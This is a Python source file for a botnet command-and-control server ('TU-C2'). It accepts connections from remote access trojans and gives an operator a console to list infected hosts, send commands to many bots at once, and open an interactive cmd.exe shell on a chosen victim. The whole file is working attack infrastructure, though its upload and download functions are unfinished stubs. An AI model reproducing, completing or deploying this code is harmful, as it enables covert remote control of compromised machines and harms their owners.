#!/usr/bin/python3

import socket
import sys
import os
import threading
import queue
import time

q = queue.Queue()


batchList = []              # List for systems that are being interacted with in BatchMode
allConnections = []         # Stores all BotHandler instances
aliveConnections = []       # Stores all currently alive BotHandler sessions
deadConnections = []        # Records the dead-instance's information
                            # This may be an odd thing to implement. 
                            # Do we simply want to store the IP address + Port + ID?


clientAddressList = {}      # Stores client_address[] info (IP, Port): IP is stored in string format, port is not

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# ======================================================================================================================================================================================
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

class Handler(threading.Thread):

    def __init__(self, client, client_address, alive, bot_id):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.isAlive = alive
        self.bot_id = bot_id
        self.info = [self.bot_id,self.ip,self.port]

    def run(self):

        # Returns 'Thread-#': Useful for specific interaction?
        # This specific line returns 'None'
        #self.BotName = threading.current_thread().getName()

        print(f"[*BotHandler-Msg] Slave {self.ip}:{str(self.port)} connected with Session ID of {str(self.bot_id)}")

        # [NIX'D] - Interesting, we can use strings (Thread-#) to index an array. Noted...
        clientAddressList[self.bot_id] = self.client_address
        # [NIX'D] - This is a useful array in which we can access Client information (IP, Port) by thread-id
    

    # Should I remove these and simply have the user select certain connections upon switching to Batch-Mode?? --- Yes
    # Decision: don't remove, keep functions. But use them in the Batch-mode interaction ---- No...

    # def activate(self):
    #     print(f"\n[*BotHandler-Msg] Activating Bot {str(self.bot_id)}...")
    #     self.isActive = True
    
    # def deactivate(self):
    #     print(f"\n[*BotHandler-Msg] Deactivating {str(self.bot_id)}...")
    #     self.isActive = False

    # def kill(self):     # hah
    #     print(f"\n[*BotHandler-Msg] Killing connection for Bot {str(self.bot_id)}...")
    #     self.execute("exit")

    #     # Record information into deadConnections[]
    #     deadConnections.append(self.info)           # Append the info so the thread can join the main thread
    #     aliveConnections.remove(self)               # Remove the Handler-thread from the Alives array


    #     print(f"\n[*BotHandler-Msg] Killing thread for BotHandler {str(self.bot_id)}...")
    #     # if(threading.current_thread().is_alive()):
    #     #     threading.current_thread().join


    def isAlive(self):
        return self.isAlive
    
    def getInfo(self):
        return self.info

    def printInfo(self):
        print(self.info)

    def getID(self):
        return self.bot_id

    def getIP(self):
        return self.ip

    def getPort(self):
        return self.port

    def shell(self):

        
        # if command is 'shell':
        #   we send the shell keyword, which initiates the cmd.exe, and then redirects all stdin/out to the socket
        #   the shell will still be receiving any information we send it, therefore thats why it closed only the cmd.exe session when we subsequently exited.
        #   We need to figure out a way to capture the shell keyword here, then send it over, while also realizing in the c2
        #   that we are going to be sending and receiving directly to and from the cmd.exe process, effectively needing a function, loop, or just to catch and exit twice[?]
        #     
        #--------
        # Current problem:
        #   Data from cmd.exe shell is hanging. I have to initially receive the welcome-msg twice (once for the Microsoft 
        #   banner and another for the initial shell/cwd output prompt). After that, 

        # Initiate shell 
        try:
            self.client.send(("shell"))             # Signals RAT to initiate cmd.exe process and forward fds to socket 
        except Exception as ex:
            print(f"[* BotHandler-Msg:ShellExec] Unable to initiate shell with bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            return False                            # unsuccessful
        else:
            recvVal = self.client.recv(2048)        # Receive reply from RAT
            print(recvVal)
            #recvVal = self.client.recv(2048))      # Second here because only the Microsoft banner was being sent. 
                                                    # Adding this captures the CWD prompt
            #print(recvVal)
            
        while (True):                                                           # Capture IO sent over socket (cmd.exe)
            try:
                cmd = str(input())                                              # Dumb capture in
            except Exception as ex:
                print(f"[* BotHandler-Msg:ShellExec] Unable to parse command")  # Error recived? pass
                print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
            else:
                try:
                    # if(cmd.casefold() == 'quit' or cmd.casefold() == 'exit'):
                    #     self.client.send("exit".encode('utf-8'))
                    #     break
                    # else:
                    self.client.send(cmd.encode('utf-8'))                       # Encode input then send
                    print(f"--data being sent = {cmd}")                         # ping for send stage
                except Exception as ex:
                    print(f"[* BotHandler-Msg:ShellExec] Unable to send command to bot {self.bot_id} at {str(self.ip)}")        #Error Received? pass
                    print(f"[* BotHandler-Msg:ShellExec] Error: {ex}")
                else:
                    print("--reached receive--")                                # ping for recv stage
                    recvVal = (self.client.recv(2048)).decode('utf-8')          # Receive reply from RAT
                    print("--printing recv--")                                  # ping for non-hanging return
                    print(recvVal)                                              # content-received

            print("==exiting loop iteration==")                                 # ping for iterative finish

        print(f"[* BotHandler-Msg:ShellExec] Exiting interaction with Bot #{self.bot_id} at {str(self.ip)}")
        return True


    def execute(self, command):

        print(f"[* BotHandler-Msg] Received Command: {str(command)} for bot {str(self.bot_id)}")

        # Single instance execution
        try:
            #command += "\n"

            # Send data/command to RAT
            self.client.send(command.encode('utf-8'))
            #print(recvVal)                                          # Display message received
        except Exception as ex:
            # for t in allConnections:
            #     if t.is_alive() == False:
            #         print("\n[!] Died Thread: " + str(t))
            #         t.join()
            print(f"[* BotHandler-Msg] Unable to send connection to bot {self.bot_id} at {str(self.ip)}")
            print(f"[* BotHandler-Msg] Error: {ex}")
            return "== Return Value Error =="
        else:
            recvVal = (self.client.recv(2048)).decode('utf-8')      # Receive reply from RAT
            return recvVal

            # TODO %%
            # print(f"[* BotHandler-Msg] Using beacon verification to test if host is still up...")
            # if(!beacon(bot_id)):
            #   <Kill connection, join the thread, ad to list of dead bots>
    


    # TODO %%
    def download(self, remotepath, localfile):
        print("TBC")

    def upload(self, localfile, remotepath):
        print("TBC")

# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# ======================================================================================================================================================================================
# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


class Interpreter(threading.Thread):
    def __init__(self, qv2):
        threading.Thread.__init__(self)     # Spawn a new thread for itself
        #self.q = qv2                        # Queue used for issuing commands

    def run(self):

        while True:

            # PRINT ALL AVAILABLE COMMANDS AND FUNCTIONS HERE
            
            cmd = str(input("[TU-C2:CONSOLE]$ ")).casefold()

            # TODO:
            # commands:
            #   - list-mods
            #   - info <bot-id>
            #   - beacon <bot-id>
            #
            # display:
            #   - usage-info^^^


            if (cmd == ""):
                print("[* Interpreter-Msg] Error: No command received. Try again...")
                pass
            elif (cmd == "exit"):
                self.exit()
            elif (cmd == "clear"):
                self.clearScreen()
            elif (cmd == "list-alive"):
                self.listAlive()
            elif (cmd == "list-dead"):
                self.listDead()
            elif (cmd == "batch-mode"):
                self.batchMode()
            elif (cmd.startswith("interact")):
                try:
                    print(cmd)
                    arg_id = int(cmd.split()[1])
                    print(arg_id)
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to process Bot ID entered...")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                else:
                    try:
                        self.interact(arg_id)
                    except Exception as ex: 
                        print(f"[* Interpreter-Msg] Unable to initiate interaction with bot {arg_id}...")
                        print(f"[* Interpreter-Msg] Error: {ex}")
            else:
                print("[* Interpreter-Msg] Unable to process command. Try again...")
                pass
            
                # print(f"[+] Sending Command: {cmd} to {str(len(allConnections))} + " bots")
                # for conn in activeConnections:                                         # for i in range(len(allConnections)):
                #     time.sleep(0.1)
                #     conn.execute(cmd)
#------------------------------------------------------------------------------------------------------------------------------
    def batchMode(self):
 
        self.clearScreen()

        print("[* Interpreter-Msg] Entering Batch-Mode execution.\n")
        print 
        print("[* Interpreter-Msg] Systems in use under this mode will each receive the same command each time you enter.")
        print("[* Interpreter-Msg] Enter QUIT into the terminal to exit batch-mode \n\n")
        print
        print

        bm_success = False
        bm_entry = ''

        # This loop is super shitty, fix it 
        while ('quit'.casefold() not in bm_entry):
            if(bm_success):
                break
            else:    
                try:
                    bm_entry = input('[* Interpreter-Msg] Enter list of Bot-IDs to interact with (seperated by spaces): ')
                    idlist = [int(n) for n in bm_entry.split()]
                    print(f"[* Interpreter-Msg] ID list obtained: {str(idlist)}")
                except Exception as ex:
                    print(f"[* Interpreter-Msg] Unable to form list of IDs to add to BatchMode-list")
                    print(f"[* Interpreter-Msg] Error: {ex}")
                    bm_success = False
                else:
                    for conn in aliveConnections:
                        if conn.getID() in idlist:
                            batchList.append(conn)
                    bm_success = True


        time.sleep(1)

        if(bm_success):
            self.clearScreen()
            print("[* Interpreter-Msg] Batch-Mode execution confirmed: ")
            print(f"[* Interpreter-Msg] The commands entered here will be sent to these Bots {idlist}")
            print("[* Interpreter-Msg] Note that this mode will not allow for individual shell environment interaction\n")
            print("[* Interpreter-Msg] Enter Q or QUIT at any time to exit this mode")
            print("[* Interpreter-Msg] Enter EXIT at any time to exit the C2\n\n")

            batch_cmd = ""

            while (True):
                batch_cmd = str(input("[TU-C2:BATCH-CMD]% "))
                
                if(batch_cmd.casefold() == "quit" or batch_cmd.casefold() == "q"):
                    batchList.clear()
                    break
                elif (batch_cmd.casefold() == "exit"):
                    batchList.clear()
                    self.exit()
                elif (batch_cmd.casefold() == "shell"):
                    print("[* Interpreter-Msg] Can't interact with individual shells in this environment")
                    print("[* Interpreter-Msg] Please exit if that is the desired result\n")
                    continue
                else:
                    try:
                        print(f"[+] Sending Command: {batch_cmd} to {str(len(aliveConnections))} bots")
                        for conn in batchList:                                     
                            time.sleep(0.1)
                            print  
                            print(f"[* BATCH-CMD] Bot #{conn.getID()} response: ")
                            print(conn.execute(batch_cmd))
                    except Exception as ex:
                        print(f"[* Interpreter-Msg] Error with sending command or receiving output: {ex}")
                        print(f"[* Interpreter-Msg] Error: {ex}")

        print(f"[* Interpreter-Msg] Exiting Batch-Mode... Returning to main-menu...")

# #------------------------------------------------------------------------------------------------------------------------------

#     # Obsolete
#     def activate(self):
#         try:
#             selectedIDs = [int(n) for n in input('[+ Activation] Enter ID list to activate (seperated by spaces): ').split()]
#             print(f"[+ Activation] ID list obtained: {str(selectedIDs)}")
#         except Exception as ex:
#             print(f"[* Interpreter-Msg] Error with activation list: {ex}")
#             print(f"[* Interpreter-Msg] Error: {ex}")
#         else:
#             for conn in allConnections:
#                 #print("Handler: ", str(conn))

#                 if conn.getID() in selectedIDs:
#                     print("Activating Bot " + str(conn.getID()))
#                     conn.activate()
#                     activeConnections.append(conn)
# #------------------------------------------------------------------------------------------------------------------------------

#     # Obsolete  
#     def deactivate(self):
#         try:
#             deselectedIDs = [int(n) for n in input('[- Deactivation] Enter IDs to deactivate (seperated by spaces): ').split()]
#             print(f"[- Deactivation] ID list obtained: {str(deselectedIDs)}")
#         except Exception as ex:
#             print(f"[* Interpreter-Msg] Error with deactivation list: {ex}")
            
#         else:
#             for conn in allConnections:
#                 if conn.getID() in deselectedIDs and conn.isActivated():
#                     print(f"[* Deactivation] Deactivating Bot {str(conn.getID())}")
#                     conn.deactivate()
#                     activeConnections.remove(conn)
#------------------------------------------------------------------------------------------------------------------------------
    def exit(self):
        print(f"[* Interpreter-Msg] Closing connection to {str(len(aliveConnections))} bots")
        for conn in aliveConnections:                                         
            time.sleep(0.1)
            conn.execute("exit")

        print("[* Interpreter-Msg] Exiting connections for all bots. Please wait...")
        time.sleep(5)
        os._exit(0)
#------------------------------------------------------------------------------------------------------------------------------
    def listAlive(self): # Change to listAlive(self)
        print("---------------------------")
        print("| List of Alive Sessions  |")
        print("----------------------------------")

        for conn in aliveConnections:
            print("| %4d | %16s | %5d |"% (conn.getID(), conn.getIP(), conn.getPort()))
            print("----------------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def listDead(self):
        print("---------------------------")
        print("| List of Dead Sessions   |")
        print("----------------------------------")

        for session in deadConnections:
            print("| %4d | %16s | %5d |"% (session[0], session[1], session[2]))
            print("----------------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def listAll(self):
        print("---------------------------")
        print("| List of All Connections |")
        print("---------------------------")

        for conn in allConnections:
            print("| %4d | %16s |"% (conn.getID(), conn.getIP()))
            print("---------------------------")
#------------------------------------------------------------------------------------------------------------------------------
    def clearScreen(self):
        os.system("clear")
#------------------------------------------------------------------------------------------------------------------------------
    def interact(self, id):
        # print("Shell function entry point")
        print(f"[* Interpreter-Msg] Entering individual interaction with Bot #{id}.\n")
        print("[* Interpreter-Msg] Be mindful that this mode is quite loud.")
        print("[* Interpreter-Msg] A CMD.EXE process has been spawned...\n\n")

        for conn in aliveConnections:
            if conn.getID() == id:
                shellExecStatus = conn.shell()

        if shellExecStatus:
            print("[* Interpreter-Msg] Shell exited graefully...\n")
        else:
            print("[* Interpreter-Msg] Shell exited with errors...\n")


#=================================================================================================================================

def listener(lhost, lport, q):

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = (lhost, lport)
    server.bind(server_address)
    server.listen(100)

    print(f"[* Listener] Starting Botnet listener on tcp://{lhost}:{str(lport)}\n")

    InterpreterThread = Interpreter(q)        # Handles interface, queue is for commands
    InterpreterThread.start()

    connRecord = 0

    while True:

        (client, client_address) = server.accept()  # start listening
        print(f"Connection received from {str(client_address[0])}")

        # BotHandler = Multiconn, a new BotHandler is spawned for each incoming connection
        newConn = Handler(client, client_address, False, connRecord)
        aliveConnections.append(newConn)
        connRecord += 1
        newConn.start()

# -------------------------------------------------------------------------------------------

#import
def main():
    if (len(sys.argv) < 3):
        print(f"[!] Usage:\n  [+] python3 {sys.argv[0]} <LHOST> <LPORT>\n  [+] Eg.: python3 {sys.argv[0]} 0.0.0.0 8080\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost, lport, q)
        except Exception as ex:
            print(f"[-] Unable to establish the Handler. Error: {str(ex)}\n")

if __name__ == '__main__':
    main()
